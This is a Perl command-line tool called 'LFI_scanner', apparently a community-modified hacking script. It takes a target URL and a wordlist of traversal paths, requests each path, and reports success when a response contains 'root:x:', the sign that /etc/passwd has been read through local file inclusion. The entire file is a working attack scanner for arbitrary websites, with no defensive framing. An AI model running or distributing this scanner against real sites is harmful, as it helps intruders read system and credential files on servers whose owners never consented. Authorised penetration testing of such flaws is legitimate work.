#!/usr/bin/perl
# modified by: kvzlx
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;

system('clear') if $^O eq 'linux'; # Clear the screen on Linux
system('cls') if $^O eq 'MSWin32'; # Clear the screen on Windows

print <<EOF;
=======================================================
=                                                     =
=         LFI_scanner v 0.1.5 by Hood3dRob1n          =
=           ~[ Updated Version by kvzlx ]~            =
=                                                     =
=======================================================

EOF

print "Enter the site URL (e.g., www.memek.com/index.php?id=): ";
chomp(my $link = <STDIN>);

if ($link !~ /^http:\/\/|https:\/\//) {
    $link = "http://$link";
}

print "Enter the path to the wordlist file: ";
chomp(my $wordlist_file = <STDIN>);

unless (-e $wordlist_file) {
    die "Wordlist file not found: $!";
}

print "Checking the version of httpd... Press [Enter]\n";
<STDIN>;

my $host = $link;
my $useragent = LWP::UserAgent->new;
my $resp = $useragent->head($host);
print $resp->headers_as_string;

print "\nChecking vulnerabilities for LFI... Press [Enter]\n";
<STDIN>;

open my $wordlist_fh, '<', $wordlist_file or die "Cannot open $wordlist_file: $!";
my @vuls = <$wordlist_fh>;
close $wordlist_fh;

print "Start scanning...\n";

my $vulnerable_path = '';

foreach my $scan (@vuls) {
    chomp $scan;
    my $url = $link . $scan;
    my $request = HTTP::Request->new(GET => $url);
    my $response = $useragent->request($request);

    if ($response->is_success && $response->content =~ /root:x:/) {
        $vulnerable_path = $scan;
        last;
    }
}

if ($vulnerable_path) {
    print "Vulnerable path found: $vulnerable_path\n";
} else {
    print "No vulnerable paths found.\n";
}

print "Scan completed.\n";

